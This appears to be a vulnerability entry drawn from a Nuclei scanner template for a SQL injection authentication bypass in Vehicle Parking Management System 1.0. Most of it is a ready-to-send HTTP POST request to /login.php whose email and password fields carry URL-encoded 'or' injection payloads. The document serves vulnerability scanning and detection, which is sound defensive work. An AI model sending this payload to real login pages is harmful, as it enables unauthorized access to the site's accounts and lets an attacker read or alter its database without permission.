# Vulnerability: Vehicle Parking Management System 1.0 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`vpms-auth-bypass.yaml`)

## Description
Vehicle Parking Management System 1.0 contains a SQL injection vulnerability via the password parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.php HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/login.php
Cookie: PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8

email=%27%3D%27%27or%27%40email.com&password=%27%3D%27%27or%27&btn_login=1
```

